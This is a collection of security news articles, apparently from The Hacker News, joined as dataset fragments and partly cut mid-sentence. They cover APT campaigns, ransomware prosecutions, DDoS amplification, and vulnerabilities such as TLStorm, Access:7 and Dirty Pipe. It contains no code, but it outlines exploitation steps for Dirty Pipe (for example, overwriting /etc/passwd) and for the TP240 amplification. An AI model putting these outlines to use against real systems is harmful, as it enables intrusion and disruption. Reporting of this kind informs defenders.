malware are different sub-groups of a larger umbrella group or that it’s the work of a single actor.\n\nSuch a claim isn’t without precedence. Just last week, Cisco Talos detailed the TTPs of another Iranian actor called MuddyWater, noting that the nation-state actor is a “conglomerate“ of multiple teams operating independently rather than a single threat actor group.\n“These conclusions, if indeed correct, would recast Kwampirs as a large-scale, multi-year attack on global healthcare supply chains conducted by a foreign state actor,“ the researchers concluded.\n“The data gathered and systems accessed in these campaigns have a wide range of potential usage, including theft of intellectual property, gathering of medical records of targets like dissidents or military leaders, or reconnaissance to aid in the planning of future destructive attacks.“\n\n\nFound this article interesting?

'text': 'Multiple security vulnerabilities have been disclosed in popular package managers that, if potentially exploited, could be abused to run arbitrary code and access sensitive information, including source code and access tokens, from compromised machines.\nIt’s, however, worth noting that the flaws require the targeted developers to handle a malicious package in conjunction with one of the affected package managers.\n“This means that an attack cannot be launched directly against a developer machine from remote and requires that the developer is tricked into loading malformed files,“ SonarSource researcher Paul Gerste said. “But can you always know and trust the owners of all packages that you use from the internet or company-internal repositories?“\n\nPackage managers refer to systems or a set of tools that are used to automate installing, upgrading, configuring third-party dependencies required for developing applications.\nWhile there are inherent security risks with rogue libraries making their way to package repositories – necessitating that the dependencies are properly scrutinized to protect against typosquatting and dependency confusion attacks – the “act of managing dependencies is usually not seen as a potentially risky operation.“\nBut the newly discovered issues in various package managers highlight that they could be weaponized by attackers to trick victims into executing malicious code. The flaws have been identified in the following package managers –\nComposer 1.x < 1.10.23 and 2.x < 2.1.9Bundler < 2.2.33Bower < 1.8.13Poetry < 1.1.9Yarn < 1.22.13pnpm < 6.15.1Pip (no fix), andPipenv (no fix)\nChief among the weaknesses is a command injection flaw in Composer’s browse command that could be abused to achieve arbitrary code execution by inserting a URL to an already published malicious package.\n\nShould the package leverage typosquatting or dependency confusion techniques, it could potentially result in a scenario where running the browse command for the library could lead to the retrieval of a next-stage payload that could then be utilized to launch further attacks.\nAdditional argument injection and untrusted search path vulnerabilities discovered in Bundler, Poetry, Yarn, Composer, Pip, and Pipenv meant that a bad actor could gain code execution by means of a malware-laced git executable or an attacker-controlled file such as a Gemfile that’s used to specify the dependencies for Ruby programs.\nFollowing responsible disclosure on September 9, 2021, fixes have been released to address the issues in Composer, Bundler, Bower, Poetry, Yarn, and Pnpm. But Composer, Pip, and Pipenv, all three of which are affected by the untrusted search path flaw, have opted not to address the bug.\n“Developers are an attractive target for cybercriminals because they have access to the core intellectual property assets of a company: source code,“ Gerste said. “Compromising them allows attackers to conduct espionage or to embed malicious code into a company’s products. This could even be used to pull off supply chain attacks.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'The Russian government has established its own TLS certificate authority (CA) to address issues with accessing websites that have arisen in the wake of sanctions imposed by the west following the country’s unprovoked military invasion of Ukraine.\nAccording to a message posted on the Gosuslugi public services portal, the Ministry of Digital Development is expected to provide a domestic replacement to handle the issuance and renewal of TLS certificates should they get revoked or expired.\nThe service is offered to all legal entities operating in Russia, with the certificates delivered to site owners upon request within 5 working days.\nTLS certificates are used to digitally bind a cryptographic key to an organization’s details, enabling web browsers to confirm the domain’s authenticity and ensure that the communication between a client computer and the target website is secure.\n\nThe proposal comes as companies like DigiCert have been restricted from doing business in Russia following sanctions by Western nations. Cybersecurity firms Avast, ESET, Fortinet, and Imperva have also suspended operations in Russia and Belarus over the Kremlin’s invasion of Ukraine.\n“In response to the evolving geopolitical situation in Ukraine, DigiCert is pausing issuance and reissuance of all certificate types affiliated with Russia and Belarus.

Is this the full totalitarian Man-in-the-Middle?,“ Guerrero-Saade tweeted.\nThe development also comes close on the heels of disclosures from Cisco Talos that opportunistic cybercriminals are cashing in on the ongoing conflict to target unwitting users seeking tools to carry out their own cyberattacks against Russian entities by offering malware purporting to be offensive cyber tools.\n“The global interest in the conflict creates a massive potential victim pool for threat actors and also contributes to a growing number of people interested in carrying out their own offensive cyber operations,“ the researchers said.\n“These observations serve as reminders that users must be on heightened alert to increased cyber threat activity as threat actors look for new ways to incorporate the Russia-Ukraine conflict into their operations.“\n\n\nFound this article interesting?

'text': 'The Iranian state-sponsored threat actor known as MuddyWater has been attributed to a new swarm of attacks targeting Turkey and the Arabian Peninsula with the goal of deploying remote access trojans (RATs) on compromised systems.\n“The MuddyWater supergroup is highly motivated and can use unauthorized access to conduct espionage, intellectual property theft, and deploy ransomware and destructive malware in an enterprise,“ Cisco Talos researchers Asheer Malhotra, Vitor Ventura, and Arnaud Zobec said in a report published today.\nThe group, which has been active since at least 2017, is known for its attacks on various sectors that help further advance Iran’s geopolitical and national security objectives. In January 2022, the U.S. Cyber Command attributed the actor to the country’s Ministry of Intelligence and Security (MOIS).\n\nMuddyWater is also believed to be a “conglomerate of multiple teams operating independently rather than a single threat actor group,“ the cybersecurity firm added, making it an umbrella actor in the vein of Winnti, a China-based advanced persistent threat (APT).\n\nThe latest campaigns undertaken by the hacking crew involve the use of malware-laced documents delivered via phishing messages to deploy a remote access trojan called SloughRAT (aka Canopy by CISA) capable of executing arbitrary code and commands received from its command-and-control (C2) servers.\nThe maldoc, an Excel file containing a malicious macro, triggers the infection chain to drop two Windows Script Files (.WSF) on the endpoint, the first one of them acting as the instrumentor to invoke and execute the next-stage payload. \nAlso discovered are two additional script-based implants, one written in Visual Basic and the other coded in JavaScript, both of which are engineered to download and run malicious commands on the compromised host.\n\nFurthermore, the latest set of intrusions marks a continuation of a November 2021 campaign that struck Turkish private organizations and governmental institutions with PowerShell-based backdoors to gather information from its victims, even as it exhibits overlaps with another campaign that took place in March 2021.\n\nThe commonalities in tactics and techniques adopted by the operators have raised the possibility that these attacks are “distinct, yet related, clusters of activity,“ with the campaigns leveraging a “broader TTP-sharing paradigm, typical of coordinated operational teams,“ the researchers noted.\nIn a second partial attack sequence observed by Cisco Talos between December 2021 and January 2022, the adversary set up scheduled tasks to retrieve VBS-based malicious downloaders, which enable the execution of payloads retrieved from a remote server. The results of the command are subsequently exfiltrated back to the C2 server.\n“While they share certain techniques, these campaigns also denote individuality in the way they were conducted, indicating the existence of multiple sub-teams beneath the Muddywater umbrella — all sharing a pool of tactics and tools to pick and choose from,“ the researchers concluded.\n\n\nFound this article interesting?

And the attacker can poison this history from userland to force the kernel to mispredict to more ’interesting’ kernel targets (i.e., gadgets) that leak data,“ the Systems and Network Security Group at Vrije Universiteit Amsterdam added.\nPut differently, a piece of malicious code can use the shared branch history, which is stored in the CPU Branch History Buffer (BHB), to influence mispredicted branches within the victim’s hardware context, resulting in speculative execution that can then be used to infer information that should be inaccessible otherwise.\n\nSpectre-BHB renders vulnerable all Intel and Arm processors that were previously affected by Spectre-V2 along with a number of chipsets from AMD, prompting the three companies to release software updates to remediate the issue.\nIntel is also recommending customers to disable Linux’s unprivileged extended Berkeley Packet Filters (eBPF), enable both eIBRS and Supervisor-Mode Execution Prevention (SMEP), and add “LFENCE to specific identified gadgets that are found to be exploitable.“\n“The [Intel eIBRS and Arm CSV2] mitigations work as intended, but the residual attack surface is much more significant than vendors originally assumed,“ the researchers said.\n“Nevertheless, finding exploitable gadgets is harder than before since the attacker can’t directly inject predictor targets across privilege boundaries. That is, the kernel won’t speculatively jump to arbitrary attacker-provided targets, but will only speculatively execute valid code snippets it already executed in the past.“\n\n\nFound this article interesting?

'text': 'Yaroslav Vasinskyi, a Ukrainian national, linked to the Russia-based REvil ransomware group has been extradited to the U.S. to face charges for his role in carrying out the file-encrypting malware attacks against several companies, including Kaseya last July.\nThe 22-year-old had been previously arrested in Poland in October 2021, prompting the U.S. Justice Department (DoJ) to file charges of conspiracy to commit fraud and related activity in connection with computers, damage to protected computers, and conspiracy to commit money laundering.\n\nRansomware is the digital equivalent of extortion wherein cybercrime actors encrypt victims’ data and take it hostage in return for a monetary payment to recover the data, failing which the stolen information is published online or sold to other third-parties.\nAccording to the DoJ, in addition to the headline-grabbing attacks on JBS and Kaseya, REvil is said to have propagated its infection to more than 175,000 computers, netting the group at least $200 million paid in virtual currency ransoms before it officially went dark late last year.\nVasinskyi, who was transported to the city of Dallas on March 3 pursuant to an extradition treaty between the U.S. and Poland, had his charges formally read in the Northern District of Texas. If convicted of all counts, Vasinskyi faces a total prison term of 115 years.\n\nAccording to the indictment, the defendant is alleged to be responsible for deploying the Sodinokibi/REvil ransomware via a supply chain attack that targeted as many as 1,500 customers of Kaseya across the globe and demanding a bitcoin ransom in exchange for gaining back access to the locked files.\n“Just eight months after committing his alleged ransomware attack on Kaseya from overseas, this defendant has arrived in a Dallas courtroom to face justice,“ said Deputy Attorney General Lisa O. Monaco. “When we are attacked, we will work with our partners here and abroad to go after cybercriminals, wherever they may be.“\n\n\nFound this article interesting?

'text': 'Threat actors have been observed abusing a high-impact reflection/amplification method to stage sustained distributed denial-of-service (DDoS) attacks for up to 14 hours with a record-breaking amplification ratio of 4,294,967,296 to 1.\nThe attack vector – dubbed TP240PhoneHome (CVE-2022-26143) – has been weaponized to launch significant DDoS attacks targeting broadband access ISPs, financial institutions, logistics companies, gaming firms, and other organizations.\n“Approximately 2,600 Mitel MiCollab and MiVoice Business Express collaboration systems acting as PBX-to-Internet gateways were incorrectly deployed with an abusable system test facility exposed to the public Internet,“ Akamai researcher Chad Seaman said in a joint advisory.\n\n“Attackers were actively leveraging these systems to launch reflection/amplification DDoS attacks of more than 53 million packets per second (PPS).“\nDDoS reflection attacks typically involve spoofing the IP address of a victim to redirect responses from a target such as DNS, NTP, or CLDAP server in such a manner that the replies sent to the spoofed sender are much bigger than the requests, leading to complete inaccessibility of the service.\nFirst sign of the attacks is said to have been detected on February 18, 2022 using Mitel’s MiCollab and MiVoice Business Express collaboration systems as DDoS reflectors, courtesy the inadvertent exposure of an unauthenticated test facility to the public internet.\n“This particular attack vector differs from most UDP reflection/amplification attack methodologies in that the exposed system test facility can be abused to launch a sustained DDoS attack of up to 14 hours in duration by means of a single spoofed attack initiation packet, resulting in a record-setting packet amplification ratio of 4,294,967,296:1.“\nSpecifically, the attacks weaponize a driver called tp240dvr (“TP-240 driver“) that’s designed to listen for commands on UDP port 10074 and “isn’t meant to be exposed to the Internet,“ Akamai explained, adding “It’s this exposure to the internet that ultimately allows it to be abused.“\n\n“Examination of the tp240dvr binary reveals that, due to its design, an attacker can theoretically cause the service to emit 2,147,483,647 responses to a single malicious command. Each response generates two packets on the wire, leading to approximately 4,294,967,294 amplified attack packets being directed toward the attack victim.“\nIn response to the discovery, Mitel on Tuesday released software updates that disables public access to the test feature, while describing the issue as an access control vulnerability that could be exploited to obtain sensitive information.\n“The collateral impact of TP-240 reflection/amplification attacks is potentially significant for organizations with internet-exposed Mitel MiCollab and MiVoice Business Express collaboration systems that are abused as DDoS reflectors/amplifiers,“ the company said.\n“This may include partial or full interruption of voice communications through these systems, as well as additional service disruption due to transit capacity consumption, state-table exhaustion of network address translations, stateful firewalls, and so forth.“\n\n\nFound this article interesting?

{'title': 'Critical Bugs Could Let Attackers Remotely Hack, Damage APC Smart-UPS Devices',
'text': 'Three high-impact security vulnerabilities have been disclosed in APC Smart-UPS devices that could be abused by remote adversaries as a physical weapon to access and control them in an unauthorized manner.\nCollectively dubbed TLStorm, the flaws “allow for complete remote takeover of Smart-UPS devices and the ability to carry out extreme cyber-physical attacks,“ Ben Seri and Barak Hadad, researchers from IoT security company Armis, said in a report published Tuesday.\n\nUninterruptible power supply (UPS) devices function as emergency backup power providers in mission-critical environments such as medical facilities, server rooms, and industrial systems. Most of the afflicted devices, totaling over 20 million, have been identified so far in healthcare, retail, industrial, and government sectors.\n\nTLStorm consists of a trio of critical flaws that can be triggered via unauthenticated network packets without requiring any user interaction, meaning it’s a zero-click attack, with two of the issues involving a case of faulty TLS handshake between the UPS and the APC cloud –\nCVE-2022-22805 (CVSS score: 9.0) – TLS buffer overflowCVE-2022-22806 (CVSS score: 9.0) – TLS authentication bypassCVE-2022-0715 (CVSS score: 8.9) – Unsigned firmware upgrade that can be updated over the network\nSuccessful exploitation of any of the flaws could result in remote code execution (RCE) attacks on vulnerable devices, which in turn could be weaponized to tamper with the operations of the UPS to physically damage the device or other assets connected to it.\n\n“By using our RCE vulnerability we were able to bypass the software protection and let the current spike periods run over and over until the DC link capacitor heated up to ~150 degrees celsius (~300F), which caused the capacitor to burst and brick the UPS in a cloud of electrolyte gas, causing collateral damage to the device,“ the researchers explained.\nTo make matters worse, the flaw in the firmware upgrade mechanism could be leveraged to plant a malicious update on UPS devices, enabling the attackers to establish persistence for extended periods of time and use the compromised host as a gateway for further attacks.\n\n“Abusing flaws in firmware upgrade mechanisms is becoming a standard practice of APTs, as has been recently detailed in the analysis of the Cyclops Blink malware, and improper signing of firmwares of embedded devices is a recurring flaw in various embedded systems,“ the researchers said.\nFollowing responsible disclosure to Schneider Electric on October 31, 2021, fixes have been released as part of Patch Tuesday updates on March 8, 2022. Customers are recommended to install the updates provided to reduce the risk of successful exploitation of these vulnerabilities.\n“UPS devices, like many other digital infrastructure appliances, are often installed and forgotten,“ the researchers concluded. “Since these devices are connected to the same internal networks as the core business systems, exploitation attempts can have severe implications.“\n\n\nFound this article interesting?

{'title': 'The Incident Response Plan - Preparing for a Rainy Day',
'text': 'The unfortunate truth is that while companies are investing more in cyber defenses and taking cybersecurity more seriously than ever, successful breaches and ransomware attacks are on the rise. While a successful breach is not inevitable, it is becoming more likely despite best efforts to prevent it from happening. \nJust as it wasn’t raining when Noah built the ark, companies must face the fact that they need to prepare - and educate the organization on - a well-thought-out response plan if a successful cyberattack does occur. Obviously, the worst time to plan your response to a cyberattack is when it happens. \nWith so many companies falling victim to cyberattacks, an entire cottage industry of Incident Response (IR) services has arisen. Thousands of IR engagements have helped surface best practices and preparedness guides to help those that have yet to fall victim to a cyberattack. \nRecently, cybersecurity company Cynet provided an Incident Response plan Word template to help companies plan for this unfortunate occurrence. \nPlanning for the Worst\nThe old adage “hope for the best, plan for the worst“ is not entirely accurate here. Most companies are actively working to protect themselves from cyberattacks and certainly not merely hoping for the best. Even so, planning for what to do post-breach is a very worthwhile endeavor so the company can immediately spring into action instead of waiting for the plan to come together. When a breach occurs, and attackers have access to the network, every second counts.\nAn IR Plan primarily documents clear roles and responsibilities for the response team and defines the high-level process the team will follow when responding to a cyber incident. The IR Plan Template created by Cynet recommends following the structured 6-step IR process defined by the SANS Institute in their Incident Handler’s Handbook, which by the way, is another great IR resource.\nThe six steps outlined are:\nPreparation—review and codify an organizational security policy, perform a risk assessment, identify sensitive assets, define which are critical security incidents the team should focus on, and build a Computer Security Incident Response Team (CSIRT).Identification—monitor IT systems and detect deviations from normal operations and see if they represent actual security incidents. When an incident is discovered, collect additional evidence, establish its type and severity, and document everything. Containment—perform short-term containment, for example, by isolating the network segment that is under attack. Then focus on long-term containment, which involves temporary fixes to allow systems to be used in production, while rebuilding clean systems.Eradication—remove malware from all affected systems, identify the root cause of the attack, and take action to prevent similar attacks in the future.Recovery—bring affected production systems back online carefully, to prevent additional attacks. Test, verify, and monitor affected systems to ensure they are back to normal activity.Lessons learned—no later than two weeks from the end of the incident, perform a retrospective of the incident. Prepare complete documentation of the incident, investigate the incident further, understand what was done to contain it and whether anything in the incident response process could be improved.\nThe IR Plan Template helps organizations codify the above into a workable plan that can be shared across the organization. Cynet’s IR Plan Template provides a checklist for each of the IR steps, which of course, can and should be customized based on each company’s particular circumstances. \nMoreover, the Cynet IR Plan Template delves into IR team structure along with roles and responsibilities to prevent everyone from running around with their hair on fire during the frantic effort to recover from a cyber incident. With a lot of moving pieces and tasks to accomplish, it’s critical that the staff prepare and know what will be expected of them. \nYou can download the Word template here\n\n\nFound this article interesting?

{'title': 'Chinese APT41 Hackers Broke into at Least 6 U.S. State Governments: Mandiant',
'text': 'APT41, the state-sponsored threat actor affiliated with China, breached at least six U.S. state government networks between May 2021 and February 2022 by retooling its attack vectors to take advantage of vulnerable internet-facing web applications.\nThe exploited vulnerabilities included “a zero-day vulnerability in the USAHERDS application (CVE-2021-44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228),“ researchers from Mandiant said in a report published Tuesday, calling it a “deliberate campaign.“\nBesides web compromises, the persistent attacks also involved the weaponization of exploits such as deserialization, SQL injection, and directory traversal vulnerabilities, the cybersecurity and incident response firm noted.\nThe prolific advanced persistent threat, also known by the monikers Barium and Winnti, has a track record of targeting organizations in both the public and private sectors to orchestrate espionage activity in parallel with financially motivated operations.\n\nIn early 2020, the group was linked to a global intrusion campaign that leveraged a variety of exploits involving Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central to strike dozens of entities in 20 countries with malicious payloads.\nThe latest disclosure continues the trend of APT41 quickly co-opting newly disclosed vulnerabilities such as Log4Shell to gain initial access into target networks, counting that of two U.S. state governments and insurance and telecom firms, within hours of it becoming public knowledge.\nThe intrusions continued well into February 2022 when the hacking crew re-compromised two U.S. state government victims that were infiltrated for the first time in May and June 2021, “demonstrating their unceasing desire to access state government networks,“ the researchers said.\nWhat’s more, the foothold established after the exploitation of Log4Shell resulted in the deployment of a new variant of a modular C++ backdoor called KEYPLUG on Linux systems, but not before performing extensive reconnaissance and credential harvesting of the target environments.\n\nAlso observed during the attacks were an in-memory dropper called DUSTPAN (aka StealthVector) that’s orchestrated to execute the next-stage payload, alongside advanced post-compromise tools like DEADEYE, a malware loader that’s responsible for launching the LOWKEY implant.\nChief among the variety of techniques, evasion methods, and capabilities used by APT41 involved the “substantially increased“ usage of Cloudflare services for command-and-control (C2) communications and data exfiltration, the researchers said.\nThough Mandiant noted it found evidence of the adversaries exfiltrating personally identifiable information that’s typically in line with an espionage operation, the ultimate goal of the campaign is currently unclear.\nThe findings also mark the second time a Chinese nation-state group has abused security flaws in the ubiquitous Apache Log4j library to penetrate targets.\nIn January 2022, Microsoft detailed an attack campaign mounted by Hafnium – the threat actor behind the widespread exploitation of Exchange Server flaws a year ago – that utilized the vulnerability to “attack virtualization infrastructure to extend their typical targeting.“\n\nIf anything, the latest activities are yet another sign of a constantly adapting adversary that’s capable of shifting its goalposts as well as refining its malware arsenal to strike entities around the world that are of strategic interest.\nThe threat actor’s incessant operations against healthcare, high-tech, and telecommunications sectors over the years have since caught the attention of the U.S. Justice Department, which issued charges against five members of the group in 2020, landing the hackers a place on the FBI’s cyber most wanted list.\n“APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector, or by rapidly operationalizing a fresh vulnerability,“ the researchers said. “The group also demonstrates a willingness to retool and deploy capabilities through new attack vectors as opposed to holding onto them for future use.“\nIn a related development, Google’s Threat Analysis Group said it took steps to block a phishing campaign staged by another Chinese state-backed group tracked as APT31 (aka Zirconium) last month that was aimed at “high profile Gmail users affiliated with the U.S. government.“\n\n\nFound this article interesting?

The variety of devices affected includes HP’s laptops, desktops, point-of-sale (PoS) systems, and edge computing nodes.\n“By exploiting the vulnerabilities disclosed, attackers can leverage them to perform privileged code execution in firmware, below the operating system, and potentially deliver persistent malicious code that survives operating system re-installations and allows the bypass of endpoint security solutions (EDR/AV), Secure Boot and Virtualization-Based Security isolation,“ American firmware security company Binarly said in a report shared with The Hacker News.\n\nThe most severe of the flaws concern a number of memory corruption vulnerabilities in the System Management Mode (SMM) of the firmware, thereby enabling the execution of arbitrary code with the highest privileges.\n\nFollowing a coordinated disclosure process with HP and CERT Coordination Center (CERT/CC), the issues were addressed as part of a series of security updates shipped on February 2 and March 8, 2022.\n“Unfortunately, most of the issues […] are repeatable failures, some of which are due to the complexity of the codebase or legacy components that get less security attention, but are still widely used in the field,“ the researchers pointed out.\nThe disclosure arrives a little over a month after Binarly publicized the discovery of 23 high-impact vulnerabilities in Insyde Software’s InsydeH2O UEFI firmware that could be weaponized to deploy persistent malware that’s capable of evading security systems.\n\nThe latest findings are also significant in light of the fact that firmware has emerged as an ever-expanding attack surface for threat actors to launch highly-targeted devastating attacks.

Included in the mix is a China-based threat actor known as Mustang Panda (aka TA416 or RedDelta) attempting to plant malware in “targeted European entities with lures related to the Ukrainian invasion.“\nThe findings were also separately corroborated by enterprise security firm Proofpoint, which detailed a multi-year TA416 campaign against diplomatic entities in Europe starting in early November 2021, counting an “individual involved in refugee and migrant services“ on February 28, 2022.\n\nThe infection sequence entailed embedding a malicious URL in a phishing message using a compromised email address of a diplomat from a European NATO country, which, when clicked, delivered an archive file incorporating a dropper that, in turn, downloaded a decoy document to retrieve the final-stage PlugX malware.\nThe disclosures come as a deluge of distributed denial-of-service (DDoS) attacks have bombarded numerous Ukraine sites, such as those associated with the Ministry of Defense, Foreign Affairs, Internal Affairs, and services like Liveuamap.\n“Russian hackers keep on attacking Ukrainian information resources nonstop,“ the State Service of Special Communications and Information Protection of Ukraine (SSSCIP) said in a tweet over the weekend.\n\n“The most powerful [DDoS] attacks exceeded 100 Gbps at their peak. Despite all the involved enemy’s resources, the sites of the central governmental bodies are available.“\nIn a related development, the Anonymous hacking collective claimed that it took down the website of the Federal Security Service of Russia and that it interrupted the live feeds for several Russian TV channels and streaming services like Wink, Ivi, Russia 24, Channel One, and Moscow 24 to broadcast war footage from Ukraine.\nThe wave of counterattacks against Russia has been galvanized by the formation of an IT Army, a crowdsourced Ukrainian government initiative that’s relying on digital warfare to disrupt Russian government and military targets.\nThe development also follows Russia’s decision to ban Facebook and throttle other widely-used social media platforms in the country just as technology companies from the U.S. have moved to sever ties with Russia, effectively creating an iron curtain and curtailing online access.\n\n\nFound this article interesting?

'text': 'As many as seven security vulnerabilities have been disclosed in PTC’s Axeda software that could be weaponized to gain unauthorized access to medical and IoT devices.\nCollectively called “Access:7,“ the weaknesses – three of which are rated Critical in severity – potentially affect more than 150 device models spanning over 100 different manufacturers, posing a significant supply chain risk.\nPTC’s Axeda solution includes a cloud platform that allows device manufacturers to establish connectivity to remotely monitor, manage and service a wide range of connected machines, sensors, and devices via what’s called the agent, which is installed by the OEMs before the devices are sold to customers.\n“Access:7 could enable hackers to remotely execute malicious code, access sensitive data, or alter configuration on medical and IoT devices running PTC’s Axeda remote code and management agent,“ researchers from Forescout and CyberMDX said in a joint report published today.\n\nOf the 100 impacted device vendors, 55% belong to the healthcare sector, followed by IoT (24%), IT (8%), financial services (5%), and manufacturing (4%) industries. No less than 54% of the customers with devices running Axeda have been identified in the healthcare sector.\nBesides medical imaging and laboratory machines, vulnerable devices include everything from ATMs, vending machines, cash management systems, and label printers to barcode scanning systems, SCADA systems, asset monitoring and tracking solutions, IoT gateways, and industrial cutters.\n\nThe list of flaws is below –\nCVE-2022-25246 (CVSS score: 9.8) – The use of hard-coded credentials in the AxedaDesktopServer.exe service that could enable remote takeover of a deviceCVE-2022-25247 (CVSS score: 9.8) – A flaw in ERemoteServer.exe that could be leveraged to send specially crafted commands to obtain Remote code execution (RCE) and full file system accessCVE-2022-25251 (CVSS score: 9.8) – Missing authentication in the Axeda xGate.exe agent that could be used to modify the agent’s configurationCVE-2022-25249 (CVSS score: 7.5) – A directory traversal flaw in the Axeda xGate.exe agent which could allow a remote unauthenticated attacker to obtain file system read access on the web serverCVE-2022-25250 (CVSS score: 7.5) – A denial-of-service (DoS) flaw in the Axeda xGate.exe agent by injecting an undocumented commandCVE-2022-25252 (CVSS score: 7.5) – A buffer overflow vulnerability in the Axeda xBase39.dll component that could result in a denial-of-service (DoS)CVE-2022-25248 (CVSS score: 5.3) – An information disclosure flaw in the ERemoteServer.exe service that exposes the live event text log to unauthenticated parties\nSuccessful exploitation of the flaws could equip attackers with capabilities to remotely execute malicious code to take full control of devices, access sensitive data, modify configurations, and shut down specific services in the impacted devices.\nThe flaws, which affect all versions of the Axeda Agent prior to 6.9.3, were reported to PTC on August 10, 2021 as part of a coordinated disclosure process that involved the U.S. Cybersecurity and Infrastructure Security Agency (CISA), Health Information Sharing and Analysis Center (H-ISAC), and the Food and Drug Administration (FDA).\n\nTo mitigate the flaws and prevent possible exploitation, users are recommended to upgrade to Axeda agent version 6.9.1 build 1046, 6.9.2 build 1049, or 6.9.3 build 1051.\nThis is not the first time critical security vulnerabilities primarily targeting healthcare systems have come to light. In December 2020, CyberMDX disclosed “MDhex-Ray,“ a severe flaw in GE Healthcare’s CT, X-Ray, and MRI imaging products that could result in the exposure of protected health information.\n“Access:7 affects a solution sold to device manufacturers that did not develop their in-house remote servicing system,“ the researchers said. “This makes it a supply chain vulnerability and hence it affects many downstream manufacturers and devices.“\n\n\nFound this article interesting?

{'title': 'The Continuing Threat of Unpatched Security Vulnerabilities',
'text': 'Unpatched software is a computer code containing known security weaknesses. Unpatched vulnerabilities refer to weaknesses that allow attackers to leverage a known security bug that has not been patched by running malicious code. Software vendors write additions to the codes, known as “patches,“ when they come to know about these application vulnerabilities to secure these weaknesses.\nAdversaries often probe into your software, looking for unpatched systems and attacking them directly or indirectly. It is risky to run unpatched software. This is because attackers get the time to become aware of the software’s unpatched vulnerabilities before a patch emerges.\nA report found that unpatched vulnerabilities are the most consistent and primary ransomware attack vectors. It was recorded that in 2021, 65 new vulnerabilities arose that were connected to ransomware. This was observed to be a twenty-nine percent growth compared to the number of vulnerabilities in 2020. \nGroups involved in ransomware are no longer just focused on single unpatched instances. They have started looking at groups of multiple vulnerabilities, third-party applications prone to vulnerabilities, protocols concerning technology, etc. It is to be noted that these groups have gone to the extent of launching attacks by recruiting insiders.\nWarnings concerning the cyber security threats of unpatched vulnerabilities to critical infrastructure entities have been issued by various governmental institutions such as the FBI, the National Security Agency, the Cybersecurity and Infrastructure Security Agency, and the Homeland Security Department.\nThis blog discusses a few examples of vulnerabilities and how updating applications can help prevent cyberattacks.\nThe Top 3 Most Severe Vulnerabilities in 2021\nThe National Institute of Standards and Technology (NIST) reported finding 18,378 vulnerabilities in 2021. According to HackerOne, software vulnerabilities increased by 20% in 2021 compared to 2020.\nThe Common Weakness Enumeration, a community-developed list of software and hardware weakness types, recorded the top 25 most dangerous software weaknesses (CWE Top 25). This list consists of the most common and impactful issues experienced over the previous two calendar years. The top three most severe vulnerabilities recorded in 2021 are:\nOut-of-bounds Write: In this type of vulnerability, the software writes data past the intended buffer’s end or before its beginning. This results in data corruption, crash, or code execution. In simple terms, it causes memory corruption. It is a result of writing to invalid memory or that which is beyond the buffer’s bounds. The sequential copy of excessive data originating from a location is only one of the many other causes.\nCross-site Scripting: This is also known as ’Improper Neutralization of Input During Web Page Generation.’ Here, user-controlled input is not neutralized or is improperly neutralized before it is placed in output that is then used as a web page served to other users. \nThese software vulnerabilities enable attackers to introduce client-side scripts into web pages viewed by other users. It is used to bypass access controls like the same-origin policy.\nOut-of-bounds Read: The software reads data past the end or before the beginning of the intended buffer in this kind of application vulnerability. Hackers can access sensitive information through unauthorized memory leaks and can crash the system. Crashes occur when an external code piece attempts to read variable amounts of data. When it comes across a sentinel, the reading operation is stopped during the process, resulting in a buffer overflow or segmentation fault.\nWhy is Updating Applications Important?\nSoftware vulnerabilities can be prevented by testing your software using application vulnerability assessment tools, white box testing, black-box testing, and other techniques and updating it regularly. You can define a set of principles to be followed in developing each software release to prevent vulnerabilities. Sign your code digitally using a code signing certificate to maintain a tamper-proof code. This will help ensure digital safety and avoid security issues.\nAn ideal and effective patch management process should include an audit system to identify patches and vulnerable systems, deploy updates, and automate the patch management process.\nSoftware updates can include repairing security holes adding new features and/or software patches. Outdated ones can be removed from your device, and new features can be introduced to upgrade the application security and prevent unpatched vulnerabilities. \nSecurity holes are covered, and your data is protected from hackers. This helps prevent attackers’ access to personal information and documents, which might be misused to commit crimes. Data is encrypted in case of ransomware attacks. Remediating vulnerabilities in the applications can also cut the chances of hackers accessing the data of people you contact.\nA hacking incident can ruin the image of your enterprise. This is one of the most important reasons why you should have an effective vulnerability and patch management process in hand and keep updating your applications regularly.\nConclusion\nA report by Redscan Labs showed that 90% of all common vulnerabilities and exposures (CVEs) uncovered in 2021 could be exploited by attackers without any technical skills. The report classifies 54% of vulnerabilities as having “high“ availability. This means that they are readily and easily accessible or exploitable by hackers.\nThis makes it important to understand what CVEs are and what needs to be done to prevent them. The first step to this is to analyze and regularly update your applications with security monitoring tools like Indusface WAS. Secondly, an effective way to tamper-proof your website is to use a code signing certificate. \nUnpatched vulnerabilities are hazardous to your digital safety and data security. Thus, it is incumbent upon software vendors to understand and follow procedures to ensure patching of website and application vulnerabilities.\n\n\nFound this article interesting?

{'title': 'Researchers Warn of Linux Kernel ’Dirty Pipe’ Arbitrary File Overwrite Vulnerability',
'text': 'Linux distributions are in the process of issuing patches to address a newly disclosed security vulnerability in the kernel that could allow an attacker to overwrite arbitrary data into any read-only files and allow for a complete takeover of affected systems.\nDubbed “Dirty Pipe“ (CVE-2022-0847, CVSS score: 7.8) by IONOS software developer Max Kellermann, the flaw “leads to privilege escalation because unprivileged processes can inject code into root processes.“\nKellermann said the bug was discovered after digging into a support issue raised by one of the customers of the cloud and hosting provider that concerned a case of a “surprising kind of corruption“ affecting web server access logs.\nThe Linux kernel flaw is said to have existed since version 5.8, with the vulnerability sharing similarities to that of Dirty Cow (CVE-2016-5195), which came to light in October 2016.\n\n“A flaw was found in the way the ’flags’ member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values,“ Red Hat explained in an advisory published Monday.\n“An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system,“ it added.\nPipe, short for pipeline, is a unidirectional inter-process communication mechanism in which a set of processes are chained together such that each process takes input from the previous process and produces output for the next process.\nExploiting the weakness requires performing the following steps: Create a pipe, fill the pipe with arbitrary data, drain the pipe, splice data from the target read-only file, and write arbitrary data into the pipe, Kellermann outlined in a proof-of-concept (PoC) exploit demonstrating the flaw.\nPut simply; the vulnerability is high risk in that it allows an attacker to perform a number of malicious actions on the system, including tampering with sensitive files such as /etc/passwd to remove a root user’s password, adding SSH keys for remote access, and even executing arbitrary binaries with the highest privileges.\nAnother damaging action 